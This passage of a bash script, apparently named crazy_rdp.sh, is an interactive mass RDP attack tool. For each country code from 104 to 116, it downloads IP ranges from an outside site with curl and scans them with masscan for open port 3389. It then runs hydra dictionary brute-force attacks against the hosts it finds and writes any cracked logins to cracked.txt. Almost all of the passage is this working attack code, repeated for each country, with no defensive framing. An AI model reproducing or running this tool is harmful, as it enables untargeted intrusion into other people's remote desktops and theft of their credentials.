echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "104" ]; then
curl http://ipdiapazon.16mb.com/Libyan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "105" ]; then
curl http://ipdiapazon.16mb.com/Liechtenstein.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "106" ]; then
curl http://ipdiapazon.16mb.com/Lithuania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "107" ]; then
curl http://ipdiapazon.16mb.com/Luxembourg.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "108" ]; then
curl http://ipdiapazon.16mb.com/Macau.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "109" ]; then
curl http://ipdiapazon.16mb.com/Macedonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "110" ]; then
curl http://ipdiapazon.16mb.com/Madagascar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "111" ]; then
curl http://ipdiapazon.16mb.com/Malawi.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "112" ]; then
curl http://ipdiapazon.16mb.com/Malaysia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "113" ]; then
curl http://ipdiapazon.16mb.com/Maldives.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "114" ]; then
curl http://ipdiapazon.16mb.com/Mali.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "115" ]; then
curl http://ipdiapazon.16mb.com/Malta.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "116" ]; then
curl http://ipdiapazon.16mb.com/Mauritania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
